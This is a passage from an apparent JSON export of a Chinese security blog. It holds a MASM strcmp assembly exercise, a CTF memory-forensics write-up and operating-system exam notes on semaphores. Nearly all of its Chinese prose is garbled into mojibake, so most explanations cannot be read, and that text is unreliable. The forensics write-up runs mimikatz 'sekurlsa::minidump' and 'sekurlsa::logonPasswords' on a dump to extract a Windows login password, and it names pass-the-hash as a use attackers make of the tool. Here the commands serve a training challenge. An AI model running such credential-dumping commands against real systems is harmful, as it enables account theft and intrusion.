&quot;Reverse Engineering&quot;, 0 ;szText==szText2szText3 db &quot;Reverse Eng&quot;, 0 ;szText&gt;szText3szText4 db &quot;Reverse Engj&quot;, 0 ;szText&lt;szText4szText5 db &quot;Reverse Engh&quot;, 0 ;szText&gt;szText5.codemain PROC LEA ESI, szText LEA EDI, szText2 ;result=0 ;LEA EDI, szText3 ;result=1 ;LEA EDI, szText4 ;result=-1 ;LEA EDI, szText5 ;result=1 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;strcmpé€»è¾‘ compare: ;æ¯”è¾ƒè¿‡ç¨‹ MOV AL,[ESI] ;å–ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹åº”ä½ç½®çš„å­—ç¬¦ï¼Œé€å…¥AL MOV AH,[EDI] ;å–ç¬¬äºŒä¸ªå­—ç¬¦ä¸²å¯¹åº”ä½ç½®çš„å­—ç¬¦ï¼Œé€å…¥AH CMP AL,AH ;æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦çš„å¤§å° JL less ;ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å°äºç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œè·³è½¬ JG greater ;ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å¤§äºç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œè·³è½¬ CMP AL,0 ;å­—ç¬¦ä¸²ä¸€å¯¹åº”ä½ç½®å­—ç¬¦ç­‰äºå­—ç¬¦ä¸²äºŒå¯¹åº”ä½ç½®å­—ç¬¦ï¼Œæ¯”è¾ƒæ˜¯å¦ä¸ºç»ˆæ­¢ç¬¦&#x27;\\0&#x27; JE equal ;ç­‰äºç»ˆæ­¢ç¬¦åˆ™ä¸¤å­—ç¬¦ä¸²ç›¸ç­‰ï¼Œè·³è½¬ ADD ESI,1 ;ä¸ç­‰äºç»ˆæ­¢ç¬¦åˆ™ç»§ç»­æ¯”è¾ƒï¼Œç´¢å¼•å€¼+1 ADD EDI,1 ;åŒä¸Š JMP compare ;é‚£æˆ‘å†æ¯”è¾ƒä¸‹ä¸€ä¸ªä½ç½®çš„å­—ç¬¦å€¼ ;ä»¥ä¸‹æ ¹æ®å­—ç¬¦ä¸²æ¯”è¾ƒè§„åˆ™å¯¹EAX(å­˜æ”¾ç»“æœ)çš„èµ‹å€¼ less: MOV EAX,-1 JMP print greater: MOV EAX,1 JMP print equal: MOV EAX,0 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; print: INVOKE crt_printf, addr format, EAX INVOKE crt_getchar INVOKE ExitProcess, 0main ENDPEND main ç¼–è¯‘ã€é“¾æ¥å°†æ”¾å…¥.asmçš„æ–‡ä»¶å¤¹ï¼Œæ”¾è¿›masm32çš„ç›®å½•ä¸‹ã€‚ Strlen.asm è¿›å…¥åˆ°æŒ‡å®šè·¯å¾„-&gt;ç¼–è¯‘ -&gt;é“¾æ¥ 1234cd C:\\masm32\\strlenml /c /coff strlen.asmlink /subsystem:console strlen.objstrlen.exe Strchr.asm è¿›å…¥åˆ°æŒ‡å®šè·¯å¾„-&gt;ç¼–è¯‘ -&gt;é“¾æ¥ 1234cd C:\\masm32\\strchrml /c /coff strchr.asmlink /subsystem:console strchr.objstrchr.exe strcmp.asm è¿›å…¥åˆ°æŒ‡å®šè·¯å¾„-&gt;ç¼–è¯‘ -&gt;é“¾æ¥ 1234cd C:\\masm32\\strcmpml /c /coff strcmp.asmlink /subsystem:console strcmp.objstrcmp.exe åè®°ç¼–è¯‘æ±‡ç¼–æºç¨‹åº1ml [/é€‰é¡¹]æ±‡ç¼–æºæ–‡ä»¶åˆ—è¡¨[/linké“¾æ¥é€‰é¡¹] ç¤ºä¾‹ 1ml /c /coff helloworld.asm é€‰é¡¹ è¯´æ˜ &#x2F;c ï¼ˆå¸¸ç”¨ï¼‰ ä»…è¿›è¡Œç¼–è¯‘ï¼Œä¸è‡ªåŠ¨é“¾æ¥ &#x2F;coff ï¼ˆå¿…ç”¨ï¼‰ äº§ç”Ÿçš„objæ–‡ä»¶æ ¼å¼ä¸ºcoffæ ¼å¼ &#x2F;Cp ï¼ˆå¸¸ç”¨ï¼‰ æºä»£ç åŒºåˆ†å¤§å°å†™ &#x2F;Fo filename æŒ‡å®šè¾“å‡ºçš„objæ–‡ä»¶å &#x2F;l pathname æŒ‡å®šincludeæ–‡ä»¶çš„è·¯å¾„ â€¦ â€¦ é“¾æ¥ç›®æ ‡æ–‡ä»¶1link [é€‰é¡¹][æ–‡ä»¶åˆ—è¡¨] ç¤ºä¾‹ 12link /subsystem:windows helloworld.obj (PEæ–‡ä»¶)link /subsystem:console helloworld.obj (æ§åˆ¶å°æ–‡ä»¶) é€‰é¡¹ è¯´æ˜ &#x2F;BASE: åœ°å€ æŒ‡å®šç¨‹åºè£…å…¥å†…å­˜çš„åŸºåœ°å€ï¼Œä¸€èˆ¬PEæ–‡ä»¶é»˜è®¤çš„è£…å…¥åœ°å€æ˜¯0x400000å¤„ï¼Œdllæ–‡ä»¶è£…å…¥0x10000000ï¼Œç”¨æ­¤é€‰é¡¹å¯ä»¥ä¿®æ”¹è¿™ä¸ªé»˜è®¤å€¼ã€‚ &#x2F;DEBUG åœ¨PEæ–‡ä»¶ä¸­åŠ å…¥è°ƒè¯•ä¿¡æ¯ã€‚ &#x2F;OUT: æ–‡ä»¶å æŒ‡å®šè¾“å‡ºæ–‡ä»¶åï¼Œé»˜è®¤çš„æ‰©å±•åæ˜¯.exe &#x2F;SUBSYSTEM:ç³»ç»Ÿå æŒ‡å®šç¨‹åºè¿è¡Œçš„æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥æ˜¯NATIVEï¼ŒWINDOWSï¼ŒCONSOLEç­‰","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"é€†å‘","slug":"å®éªŒ/é€†å‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E9%80%86%E5%90%91/"}],"tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://gryffinbit.top/tags/%E6%B1%87%E7%BC%96/"}],"author":"Gryffinbit"},{"title":"2021.1.25èµ›-Ironman","slug":"2021-1-25èµ›","date":"2021-01-28T10:49:19.000Z","updated":"2024-11-12T07:00:22.000Z","comments":true,"path":"2021/01/28/2021-1-25èµ›/","permalink":"https://gryffinbit.top/2021/01/28/2021-1-25%E8%B5%9B/","excerpt":"","text":"é™„ä»¶é“¾æ¥æœ¬æ¬¡é¢˜ç›®åŸé¢˜ä»¥åŠéœ€è¦çš„é™„ä»¶ï¼š https://gryffinbit.lanzous.com/iJtnakypguf æ›´å¤šå…³äºæ­¤æ¬¡å–è¯é¢˜ç›®çš„çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥å‚è€ƒ æ´»å–è¯å’Œæ­»å–è¯ volatilityå–è¯å·¥å…·çš„ä½¿ç”¨ æˆ–è€…åˆ†ç±»ä¸‹çš„å…¥ä¾µæ£€æµ‹ä¸å–è¯æ–‡ä»¶å¤¹ã€‚ é¢˜ç›®æ€è·¯æ¦‚è¿°æ˜¯ä¸€ä¸ªåŸºç¡€çš„å–è¯é¢˜ç›®ã€‚è€ƒå¯Ÿæ–¹å‘ï¼Œå¯¹ç™»é™†å¯†ç å–è¯ï¼Œå–è¯å›¾ç‰‡å’Œæ–‡å­—ã€‚ é¦–å…ˆæ‹¿åˆ°é¢˜ç›®æ˜¯ä¸€ä¸ªkey.dmpå’Œä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…ã€‚ æ€è·¯æ˜¯ï¼šå–è¯key.dmpè·å–åˆ°Windows7çš„ç”¨æˆ·åå’Œç™»é™†å¯†ç ã€‚ç™»é™†å¯†ç å³å‹ç¼©åŒ…çš„è§£å¯†å¯†ç ã€‚ è§£å¯†å‹ç¼©åŒ…ï¼Œå¾—åˆ°ä¸¤ä¸ªflagã€‚flag1æ˜¯å›¾ç‰‡å–è¯ã€‚flag2æ˜¯æ–‡å­—å–è¯ã€‚ æœ€ç»ˆæ ¹æ®æ–‡å­—å–è¯åˆ°çš„é“¾æ¥ï¼Œæ‰¾åˆ°flagã€‚ éœ€è¦ç”¨åˆ°çš„è½¯ä»¶stringsï¼šæ‰“å°æ–‡ä»¶ä¸­å¯æ‰“å°çš„å­—ç¬¦ï¼Œç»å¸¸ç”¨æ¥å‘ç°æ–‡ä»¶ä¸­çš„ä¸€äº›æç¤ºä¿¡æ¯æˆ–æ˜¯ä¸€äº›ç‰¹æ®Šçš„ç¼–ç ä¿¡æ¯ï¼Œå¸¸å¸¸ç”¨æ¥å‘ç°é¢˜ç›®çš„çªç ´å£ã€‚ Mimikatzï¼šæ˜¯ä¸€æ¬¾èƒ½å¤Ÿä»Windowsè®¤è¯(LSASS)çš„è¿›ç¨‹ä¸­è·å–å†…å­˜ï¼Œå¹¶ä¸”è·å–æ˜æ–‡å¯†ç å’ŒNTLMå“ˆå¸Œå€¼çš„å·¥å…·ï¼Œæ”»å‡»è€…å¯ä»¥å€Ÿæ­¤æ¼«æ¸¸å†…ç½‘ã€‚ä»–ä»¬å¯ä»¥é€šè¿‡æ˜æ–‡å¯†ç æˆ–è€…ä¼ é€’hashå€¼æ¥ææƒ gimpï¼škaliä¸‹çš„ï¼ˆphotoshopçš„Linuxç‰ˆï¼‰ å…·ä½“æ­¥éª¤è·å–key ä½¿ç”¨mimikatz æŠŠ key.dmp æ–‡ä»¶æ‹·è´åˆ° mimikatz.exe æ‰€åœ¨æ–‡ä»¶å¤¹ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ mimikatz.exe ç¨‹åºã€‚ è¾“å…¥::å›è½¦ï¼Œå¯ä»¥æŸ¥çœ‹ mimikatz æ‰€æœ‰çš„æ¨¡å—ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨çš„æ¨¡å—æ˜¯ sekurlsaã€‚ åœ¨ä¾æ¬¡ä½¿ç”¨å‘½ä»¤ 12sekurlsa::minidump key.dmp sekurlsa::logonPasswords å°±å¯ä»¥æŠŠç”¨æˆ·åå’Œå¯†ç æå–å‡ºæ¥ã€‚ Dino209 å–è¯flag1åœ¨kaliä¸‹åˆ†æflag1. kali ä¸‹æå–å›¾åƒä¿¡æ¯ä½¿ç”¨çš„å·¥å…·æ˜¯ gimp(photoshop çš„ linux ç‰ˆï¼‰ ğŸ‘‰ä¸ºé¿å…æ‰¾ä¸åˆ°gimpåŒ…ï¼Œå…ˆè¿›è¡Œä¿®å¤ï¼Œå†å®‰è£…gimp 12apt --fix-broken install apt-get install gimp ğŸ‘‰gimpä¸èƒ½ç›´æ¥æ‰“å¼€dmpæ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥æ‰“å¼€dataæ–‡ä»¶ï¼Œä¸¤ç§ç±»å‹æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œ æŠŠflag1.dmp æ”¹åä¸º flag1.data 1mv mspaint.dmp mspaint.data ğŸ‘‰æ‰“å¼€åæ˜¾ç¤ºçš„å›¾ç‰‡æ˜¯ä¸€å›¢æ··ä¹±çš„åƒç´ ç‚¹ï¼Œé€šè¿‡è°ƒèŠ‚å®½åº¦ã€é«˜åº¦ä»¥åŠä½ç§»ä¸‰ä¸ªå‚æ•°ï¼Œä»æ··ä¹±ä¸­å¯»æ‰¾å¯èƒ½çš„å›¾åƒ åœ¨kaliçš„èœå•æ ä¸­æ‰¾åˆ°gimpï¼Œè¿è¡Œ æ‰“å¼€dataæ–‡ä»¶ è°ƒèŠ‚å®½åº¦ã€é«˜åº¦ï¼Œhintç»™å‡º1080x1577 è°ƒæ•´ä½ç§»åˆ°åˆé€‚çš„ä½ç½®ï¼Œæ˜¾ç¤ºå®Œæ•´å›¾ç‰‡ å–è¯flag2 ä½¿ç”¨ strings å·¥å…·æå–å‡ºå…¶ä¸­çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ã€‚ åœ¨Windows7 ä¸‹ï¼Œç®¡ç†å‘˜èº«ä»½è¿è¡Œcmd 1strings.exe flag2.dmp &gt; flag2.txt è¿™ä¸ä»…é€‚ç”¨äº notepad ç¨‹åºï¼Œåªè¦å½“å‰ç³»ç»Ÿä¸­æ­£åœ¨ä½¿ç”¨çš„æ–‡å­—å¤„ç†è½¯ä»¶ï¼Œå¦‚:wordã€ outlook(é‚®ä»¶)ç­‰ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„æ–¹æ³• dump å†…å­˜ä¸­æ•°æ®å†…å®¹ã€‚ æå–åˆ°ä¸€ä¸ªæ¯”è¾ƒåˆ°çš„å¤§çš„txtï¼Œæœç´¢flagã€‚æ‰¾åˆ°flag{}åŒ…ç€ä¸€ä¸ªé“¾æ¥ï¼Œæ‰“å¼€é“¾æ¥ä¸‹è½½flag","categories":[{"name":"write up","slug":"write-up","permalink":"https://gryffinbit.top/categories/write-up/"}],"tags":[{"name":"å–è¯","slug":"å–è¯","permalink":"https://gryffinbit.top/tags/%E5%8F%96%E8%AF%81/"}],"author":"Gryffinbit"},{"title":"æ“ä½œç³»ç»ŸæœŸæœ«è€ƒç‚¹","slug":"æ“ä½œç³»ç»ŸæœŸæœ«è€ƒç‚¹","date":"2021-01-21T15:10:00.000Z","updated":"2024-11-12T07:00:20.000Z","comments":true,"path":"2021/01/21/æ“ä½œç³»ç»ŸæœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/01/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"è€ƒå·é€‰æ‹©é¢˜ æŸè®¡ç®—æœºç³»ç»Ÿä¸­æœ‰8å°æ‰“å°æœºï¼Œç”±Kä¸ªè¿›ç¨‹ç«äº‰ä½¿ç”¨ï¼Œæ¯ä¸ªè¿›ç¨‹æœ€å¤šéœ€è¦3å°æ‰“å°æœºï¼Œè¯¥ç³»ç»Ÿå‘ç”Ÿæ­»é”çš„Kçš„æœ€å°å€¼æ˜¯_____C_________ ã€‚ A. 2 B. 3 C.4 D.5 æ“ä½œç³»ç»Ÿé‡‡ç”¨ç¼“å†²æŠ€æœ¯ï¼Œèƒ½å¤Ÿå‡å°‘å¯¹CPUçš„_____A______æ¬¡æ•°ï¼Œä»è€Œæé«˜èµ„æºçš„åˆ©ç”¨ç‡ã€‚ A.ä¸­æ–­ B.è®¿é—® C.æ§åˆ¶ D.ä¾èµ– ç´¢å¼•å¼ï¼ˆéšæœºï¼‰æ–‡ä»¶ç»„ç»‡çš„ä¸€ä¸ªä¸»è¦ä¼˜ç‚¹æ˜¯_____B_________ã€‚ A.ä¸éœ€è¦é“¾æ¥æŒ‡é’ˆ B.èƒ½å®ç°ç‰©ç†å—çš„åŠ¨æ€åˆ†é… C. å›æ”¶å®ç°æ¯”è¾ƒç®€å• D.ç”¨æˆ·å­˜å–æ–¹ä¾¿ å¡«ç©ºé¢˜1.æ–‡ä»¶çš„ç‰©ç†ç»“æ„æœ‰ï¼Œé¡ºåºç»“æ„ã€ é“¾æ¥ç»“æ„ã€å’Œç´¢å¼•ç»“æ„ã€‚ 2.ç£ç›˜é«˜é€Ÿç¼“å†²æ˜¯åœ¨å†…å­˜ä¸­ä¸ºç£ç›˜å¿«è®¾ç½®çš„ä¸€ä¸ªç¼“å†²åŒºï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯æé«˜ç£ç›˜çš„I&#x2F;Oé€Ÿåº¦ã€‚ 3.ä½ç¤ºå›¾æ˜¯åˆ©ç”¨äºŒè¿›åˆ¶çš„ä¸€ä½æ¥è¡¨ç¤ºæ–‡ä»¶å­˜å‚¨ç©ºé—´ä¸­çš„ä¸€ä¸ªå—çš„ä½¿ç”¨æƒ…å†µã€‚ 4.SPOOLingæŠ€æœ¯çš„ä¸­æ–‡è¯‘åä¸ºå¤–éƒ¨è®¾å¤‡è”æœºå¹¶è¡Œæ“ä½œï¼Œå®ƒæ˜¯å…³äºæ…¢é€Ÿå­—ç¬¦è®¾å¤‡å¦‚ä½•ä¸è®¡ç®—æœºä¸»æœºäº¤æ¢ä¿¡æ¯çš„ä¸€ç§æŠ€æœ¯ï¼Œé€šå¸¸å«ä½œå‡è„±æœºæŠ€æœ¯ã€‚ ç¼–å†™ç¨‹åºï¼ˆPVæºè¯­ï¼‰ä¸‰é€‰ä¸€ æœ‰ä¸‰ä¸ªè¿›ç¨‹ PAã€PBå’ŒPCåä½œè§£å†³æ–‡ä»¶æ‰“å°é—®é¢˜ã€‚PAå°†æ–‡ä»¶è®°å½•ä»ç£ç›˜è¯»å…¥å†…å­˜çš„ç¼“å†²åŒº1ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡è¯»ä¸€ä¸ªè®°å½•ï¼›PB å°†ç¼“å†²åŒº1çš„å†…å®¹å¤åˆ¶åˆ°ç¼“å†²åŒº2ä¸­ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡å¤åˆ¶ä¸€ä¸ªè®°å½•ï¼›PCå°†ç¼“å†²åŒº2çš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡æ‰“å°ä¸€ä¸ªè®°å½•ã€‚ç¼“å†²åŒºçš„å¤§å°ä¸è®°å½•å¤§å°ä¸€æ ·ã€‚è¯·ç”¨ä¿¡å·é‡æ¥ä¿è¯æ–‡ä»¶çš„æ­£ç¡®æ‰“å°ã€‚ åˆ†æï¼šæœ¬é¢˜åˆæ˜¯ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜çš„ä¸€ä¸ªå˜å½¢ï¼Œå¯¹ç¼“å†²åŒº1æ¥è¯´ï¼ŒPAæ˜¯ç”Ÿäº§è€…ï¼ŒPBæ˜¯æ¶ˆè´¹è€…;å¯¹ç¼“å†²åŒº2æ¥è¯´ï¼ŒPBæ˜¯ç”Ÿäº§è€…ï¼ŒPCæ˜¯æ¶ˆè´¹è€…ã€‚éœ€è¦è¯´æ˜çš„æœ‰ä¸¤ç‚¹ï¼šâ‘ ç¼“å†²åŒº1å’Œç¼“å†²åŒº2éƒ½åªèƒ½å­˜æ”¾ä¸€ä¸ªè®°å½•ï¼Œæ•…æ— é¡»è®¾ç½®inã€out æŒ‡é’ˆï¼ŒåŸæ¥ç”Ÿäº§è€…ä¸€æ¶ˆè´¹è€…é—®é¢˜ä¸­çš„mutexä¿¡å·é‡ä¹Ÿå› æ­¤å¯ä»¥çœå»ï¼›â‘¡PBè¿›ç¨‹æ—¢æ˜¯æ¶ˆè´¹è€…ï¼Œåˆæ˜¯ç”Ÿäº§è€…ã€‚ 123456789101112131415161718192021222324252627282930313233//è¯¥æ–‡ä»¶æ‰“å°è¿‡ç¨‹çš„åŒæ­¥ç®—æ³•å¯æè¿°ä¸ºï¼šsemaphore empty1=1, full=0, empty2=1, full2=0;PA()&#123; while(1)&#123; ä»ç£ç›˜è¯»ä¸€ä¸ªè®°å½•; wait(empty1); å°†è®°å½•å­˜æ”¾åˆ°ç¼“å†²åŒº1ä¸­; signal(full); &#125;&#125;PB()&#123; while(1)&#123; wait(full); ä»ç¼“å†²åŒº1ä¸­å–å‡ºä¸€ä¸ªè®°å½•; signal(empty1); wait(empty2); å°†è®°å½•å¤åˆ¶åˆ°ç¼“å†²åŒº2ä¸­; signal(full2); &#125;&#125;PC()&#123; while(1)&#123; wait(full2); ä»ç¼“å†²åŒº2ä¸­å–å‡ºä¸€ä¸ªè®°å½•; signal(empty2); å°†å–å‡ºçš„è®°å½•æ‰“å°å‡ºæ¥; &#125;&#125;main()&#123; cobegin PA(); PB(); PC(); coend&#125; è¯·ç”¨ä¿¡å·é‡è§£å†³ä»¥ä¸‹çš„â€œè¿‡ç‹¬æœ¨æ¡¥â€é—®é¢˜ï¼šåŒä¸€æ–¹å‘çš„è¡Œäººå¯è¿ç»­è¿‡æ¡¥ï¼Œå½“æŸä¸€æ–¹å‘æœ‰äººè¿‡æ¡¥æ—¶ï¼Œå¦ä¸€æ–¹å‘çš„è¡Œäººå¿…é¡»ç­‰å¾…;å½“æŸä¸€æ–¹å‘æ— äººè¿‡æ¡¥æ—¶ï¼Œå¦ä¸€æ–¹å‘çš„è¡Œäººå¯ä»¥è¿‡æ¡¥ã€‚ åˆ†æï¼šç‹¬æœ¨æ¡¥é—®é¢˜æ˜¯è¯»è€…ä¸€å†™è€…é—®é¢˜çš„ä¸€ä¸ªå˜å½¢ï¼Œ åŒä¸€ä¸ªæ–¹å‘çš„è¡Œäººå¯ä»¥åŒæ—¶è¿‡æ¡¥ï¼Œè¿™ç›¸å½“äºè¯»è€…å¯ä»¥åŒæ—¶è¯»ã€‚å› æ­¤ï¼Œå¯å°†ä¸¤ä¸ªæ–¹å‘çš„è¡Œäººçœ‹åšæ˜¯ä¸¤ç±»ä¸åŒçš„è¯»è€…ï¼ŒåŒç±»è¯»è€…(è¡Œäºº)å¯ä»¥åŒæ—¶è¯»(è¿‡æ¡¥)ï¼Œä½†ä¸åŒç±»è¯»è€…(è¡Œäºº)ä¹‹é—´å¿…é¡»äº’æ–¥åœ°è¯»(è¿‡æ¡¥)ã€‚ 12345678910111213141516//å¯ä¸ºç‹¬æœ¨æ¡¥é—®é¢˜å®šä¹‰å¦‚ä¸‹çš„å˜é‡ï¼šint count A =0, count B = 0; //count A, count B åˆ†åˆ«è¡¨ç¤ºAã€Bä¸¤ä¸ªæ–¹å‘è¿‡æ¡¥çš„è¡Œäººæ•°é‡semaphore bridge = 1; //ç”¨æ¥å®ç°ä¸åŒæ–¹å‘è¡Œäººå¯¹æ¡¥çš„äº’æ–¥å…±äº«semaphore mutex A = mutex B = 1; //åˆ†åˆ«ç”¨æ¥å®ç°å¯¹ count Aã€count Bçš„äº’æ–¥å…±äº«//Aæ–¹å‘çš„æ‰€æœ‰è¡Œäººå¯¹åº”ç›¸åŒçš„ç®—æ³•ï¼Œä»–ä»¬çš„åŠ¨ä½œçš„ç®—æ³•å¯æè¿°ä¸ºï¼šPA()&#123; wait(mutex A); if(count A == 0) wait(bridge); count A++; signal(mutex A); è¿‡æ¡¥; wait(mutex A); count A--; if(count A == 0)signal(bridge); signal(mutex A);&#125; è¯·ç»™å‡ºä¸€ä¸ªå†™è€…ä¼˜å…ˆçš„ â€œè¯»è€…â€”å†™è€…â€é—®é¢˜çš„ç®—æ³•æè¿°ã€‚ åˆ†æ:ä¸è¯»è€…ä¼˜å…ˆä¸åŒçš„æ–¹æ¡ˆæœ‰ä¸‰ç§ã€‚ç¬¬ä¸€ç§æ˜¯è¯»è€…å’Œå†™è€…çš„åœ°ä½æ˜¯å®Œå…¨å¹³ç­‰çš„ï¼Œå³æ— è®ºæ˜¯è¯»è€…è¿˜æ˜¯å†™è€…ï¼Œéƒ½æŒ‰ä»–ä»¬åˆ°è¾¾çš„æ—¶é—´å…ˆåå†³å®šä¼˜å…ˆæ¬¡åºã€‚ç¬¬äºŒç§æ–¹æ¡ˆä¸­ï¼Œå†™è€…çš„ä¼˜å…ˆæƒå¾—åˆ°äº†æé«˜ï¼Œå…ˆäºå†™è€…åˆ°è¾¾çš„è¯»è€…æ¯”å†™è€…ä¼˜å…ˆï¼Œä½†å½“ä¸€ä¸ªå†™è¿›ç¨‹å£°æ˜è¦è¿›è¡Œå†™æ“ä½œæ—¶ï¼Œå…¶åç»­è¯»è€…å¿…é¡»ç­‰å†™æ“ä½œå®Œæˆä¹‹åï¼Œæ‰èƒ½è¿›è¡Œè¯»ï¼›è€Œä¸”ï¼Œå¦‚æœåœ¨å†™å®Œæˆä¹‹å‰ï¼Œåˆæœ‰æ–°çš„å†™è€…åˆ°è¾¾ï¼Œé‚£æ–°çš„å†™è€…çš„ä¼˜å…ˆæƒå°†é«˜äºå·²åœ¨ç­‰å¾…çš„è¯»è€…ã€‚ç¬¬ä¸‰ç§æ–¹æ¡ˆå†™è€…çš„ä¼˜å…ˆæƒæ›´é«˜ï¼ŒæŸä¸ªå†™è€…åˆ°è¾¾æ—¶ï¼Œå³ä½¿ä»–æ˜¯ç›®å‰å”¯ä¸€çš„å†™è€…ï¼Œé‚£äº›å…ˆäºä»–åˆ°è¾¾ä½†è¿˜æ²¡æ¥å¾—åŠè¯»çš„è¯»è€…éƒ½å°†ç­‰å¾…ä»–å®Œæˆå†™æ“ä½œã€‚ ç­”:ä¸ºäº†ä½¿å†™è€…ä¼˜å…ˆï¼Œå¯åœ¨åŸæ¥çš„è¯»ä¼˜å…ˆç®—æ³•åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªåˆå€¼ä¸º1çš„ä¿¡å·é‡Sï¼Œä½¿å¾—å½“è‡³å°‘æœ‰ä¸€ä¸ªå†™è€…å‡†å¤‡è®¿é—®å…±äº«å¯¹è±¡æ—¶ï¼Œå®ƒå¯ä½¿åç»­çš„è¯»è€…è¿›ç¨‹ç­‰å¾…å†™å®Œæˆï¼›åˆå€¼ä¸º0çš„æ•´å‹å˜é‡writecountï¼Œç”¨æ¥å¯¹å†™è€…è¿›è¡Œè®¡æ•°ï¼›åˆå€¼ä¸º1çš„äº’æ–¥ä¿¡å·é‡wmutexï¼Œç”¨æ¥å®ç°å¤šä¸ªå†™è€…å¯¹writecountçš„äº’æ–¥è®¿é—®ã€‚è¯»è€…åŠ¨ä½œçš„ç®—æ³•æè¿°å¦‚ä¸‹: 1234567891011121314151617181920212223242526272829303132//ç¬¬äºŒç§æ–¹æ¡ˆreader()&#123; while(1)&#123; wait(S); wait(rmutex); //rmutex ç”¨æ¥å®ç°å¯¹readcountçš„äº’æ–¥è®¿é—® if(readcount == 0) wait(mutex); //mutexç”¨æ¥å®ç°å¯¹è¯»å†™å¯¹è±¡äº’æ–¥è®¿é—® readcount++; signal(rmutex); signal(S); perform read operation; wait(rmutex); readcount--; if(readcount == 0) signal(mutex); signal(rmutex); &#125;&#125;//å†™è€…åŠ¨ä½œçš„ç®—æ³•æè¿°å¦‚ä¸‹ï¼šwriter()&#123; while(1)&#123; wait(wmutex); //wmutexç”¨æ¥å®ç°å¯¹writecountçš„äº’æ–¥è®¿é—® if(writecount == 0) wait(S); writecount++; signal(wmutex); wait(mutex); perform write operation; signal(mutex); wait(wmutex); writecount--; if(writecount == 0) signal(S); signal(wmutex); &#125;&#125; clockç®—æ³• ç®€ç­”é¢˜ä»€ä¹ˆæ˜¯è¿›ç¨‹?ç”±å‡ éƒ¨åˆ†ç»„æˆ?ä¸ç¨‹åºçš„åŒºåˆ«æ˜¯ä»€ä¹ˆ? å®šä¹‰ï¼š è¿›ç¨‹æ˜¯å¯å¹¶å‘æ‰§è¡Œçš„ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„è¿è¡Œè¿‡ç¨‹ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ä¸€ä¸ªç‹¬ç«‹å•ä½ã€‚ ç»„æˆéƒ¨åˆ†ï¼š è¿›ç¨‹ç”±ç¨‹åºã€æ•°æ®å’Œè¿›ç¨‹æ§åˆ¶å—ä¸‰éƒ¨åˆ†ç»„æˆ: . ç¨‹åºæ®µï¼šç¨‹åºæ®µæ˜¯è¿›ç¨‹ä¸­èƒ½è¢«è¿›ç¨‹è°ƒåº¦ç¨‹åºè°ƒåº¦åˆ°CPUä¸Šæ‰§è¡Œçš„ç¨‹åºä»£ç æ®µï¼Œå®ƒèƒ½å®ç°ç›¸åº”çš„ç‰¹å®šåŠŸèƒ½ã€‚ æ•°æ®æ®µï¼šä¸€ä¸ªè¿›ç¨‹çš„æ•°æ®æ®µï¼Œå¯ä»¥æ˜¯è¿›ç¨‹å¯¹åº”çš„ç¨‹åºåŠ å·¥å¤„ç†çš„åŸå§‹æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ˜¯ç¨‹åºæ‰§è¡Œæ—¶äº§ç”Ÿçš„ä¸­é—´æˆ–æœ€ç»ˆç»“æœæ•°æ®ã€‚ è¿›ç¨‹æ§åˆ¶å—PCBç»„æˆï¼šæ¯ä¸€ä¸ªè¿›ç¨‹å‡æœ‰ä¸€ä¸ªè¿›ç¨‹æ§åˆ¶å—PCBã€‚ç”¨æˆ·è¿›ç¨‹è¢«åˆ›å»ºæ—¶ï¼Œç³»ç»Ÿä¸ºå®ƒç”³è¯·å’Œæ„é€ ä¸€ä¸ªç›¸åº”çš„PCBã€‚ è¿›ç¨‹å’Œç¨‹åºçš„åŒºåˆ«ï¼š ç¨‹åºæ˜¯é™æ€æ¦‚å¿µï¼Œè€Œè¿›ç¨‹æ˜¯åŠ¨æ€æ¦‚å¿µ ç¨‹åºæ˜¯æ°¸ä¹…çš„ï¼Œè€Œè¿›ç¨‹æ˜¯æš‚æ—¶çš„ è¿›ç¨‹ä¹‹é—´èƒ½å¹¶å‘åœ°æ´»åŠ¨ è¿›ç¨‹æ˜¯ç«äº‰è®¡ç®—æœºç³»ç»Ÿæœ‰é™èµ„æºçš„åŸºæœ¬å•ä½ ç¨‹åºå’Œè¿›ç¨‹æ— ä¸€ä¸€å¯¹åº”å…³ç³» ä½•è°“æ­»é”?äº§ç”Ÿæ­»é”çš„åŸå› å’Œå¿…è¦æ¡ä»¶æ˜¯ä»€ä¹ˆ? æ­»é”çš„å®šä¹‰ï¼š æ­»é”æ˜¯æŒ‡å¤šä¸ªè¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å› äº‰å¤ºèµ„æºè€Œé€ 